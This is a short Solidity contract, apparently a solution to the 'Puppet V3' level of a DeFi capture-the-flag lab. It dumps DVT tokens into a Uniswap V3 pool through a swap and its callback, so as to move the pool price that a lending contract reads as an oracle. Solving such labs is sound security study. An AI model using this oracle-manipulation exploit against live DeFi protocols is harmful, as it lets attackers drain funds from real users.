// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;
pragma abicoder v2;

import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/libraries/TransferHelper.sol";
import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";


contract ExploitPuppetV3 is IUniswapV3SwapCallback {

    address pool;
    address player;
    address weth;
    address token;

    constructor(address _pool, address _player, address _weth, address _token) {
        pool = _pool;
        player = _player;
        weth = _weth;
        token = _token;
    }

    function exploit(int256 amountIn, uint160 pricex96) external payable {

        uint256 amountToTransfer;

        if(amountIn < 0) {
            amountToTransfer = uint256(-amountIn);
        } else {
            amountToTransfer = uint256(amountIn);
        }

        IERC20Minimal(token).transferFrom(player, address(this), amountToTransfer);

        // token0 is weth, token1 is DVT
        // swap DVT for WETH
        IUniswapV3Pool(pool).swap(
            player,
            false,
            amountIn,
            pricex96,
            ""
        );
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) external override {

        // Transfer token1
        if(amount0Delta < 0)
            IERC20Minimal(token).transfer(pool, uint256(amount1Delta));
            
        // Transfer token0
        else
            IERC20Minimal(token).transfer(pool, uint256(amount0Delta));
        
    }
}